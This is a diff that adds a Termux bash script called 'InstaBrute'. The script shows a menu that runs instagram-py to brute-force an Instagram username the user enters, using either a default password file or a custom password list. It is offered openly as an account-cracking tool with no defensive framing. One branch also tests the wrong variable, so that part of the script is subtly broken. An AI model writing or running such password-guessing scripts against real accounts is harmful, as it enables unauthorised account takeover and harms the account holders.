@@ -1,0 +1,48 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# created by Anon4You [Alienkrishn]
+# Author : Bishal Singh
+clear
+echo $'\e[32;1m'""
+toilet -f smblock "  InstaBrute"
+echo $'\e[0m'"              Alienkrishn"
+echo $'\e[34m'"             GitHub.com/Anon4You"
+echo $'\e[0m'""
+echo """
+[1] Attack with default password
+[2] Attack with custom password
+[3] Create password
+[4] About Me and other tools
+[0] Exit
+
+"""
+read -p "Instabrute: " xxx
+
+if [ $zzz = 1 ] ; then
+read -p "Enter username: " usrnm
+clear
+toilet -f smblock InstaBrute
+echo ""
+instagram-py -u $usrnm -p .PSS
+fi
+
+if [ $xxx = 2 ] ; then
+read -p "Enter usrname: " usrnm
+read -p "Password list: " pss
+clear
+toilet -f smblock InstaBrute
+echo ""
+instagram-py -u $usrnm -p $pss
+fi
+
+if [ $xxx = 3 ] ; then
+clear
+anonps -i
+fi
+if [ $xxx = 4 ] ; then
+xdg-open https://github.com/Anon4You
+fi
+
+if [ $xxx = 0 ] ; then
+exit
+fi
+
